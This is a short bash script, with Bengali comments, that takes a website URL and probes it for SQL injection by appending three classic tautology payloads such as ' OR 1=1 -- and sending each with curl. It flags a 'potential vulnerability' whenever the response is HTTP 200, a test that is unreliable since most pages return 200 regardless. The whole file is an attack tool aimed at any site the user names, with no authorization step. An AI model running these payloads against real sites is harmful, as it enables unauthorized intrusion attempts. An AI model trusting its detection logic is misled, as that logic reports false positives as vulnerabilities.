#!/bin/bash

# ওয়েবসাইট URL ইনপুট নিন
echo "Enter Website URL for SQL Injection Test (e.g., http://example.com/product?id=1):"
read URL

# SQL ইনজেকশন প্যারামিটার পরীক্ষা
echo "Testing for SQL Injection on $URL"

# সাধারণ SQL ইনজেকশন প্যারামিটার
SQL_PAYLOADS=("' OR 1=1 --" "' OR 'a'='a' --" "' OR 'x'='x' --")

for payload in "${SQL_PAYLOADS[@]}"
do
    # প্রতিটি প্যারামিটার দিয়ে টেস্ট করা
    TEST_URL="${URL}${payload}"
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" $TEST_URL)

    # যদি 200 HTTP কোড পাওয়া যায়, তবে SQL ইনজেকশন পদ্ধতি সম্ভব
    if [ "$RESPONSE" == "200" ]; then
        echo "[+] Potential SQL Injection vulnerability detected with payload: $payload"
    else
        echo "[-] No vulnerability detected with payload: $payload"
    fi
done
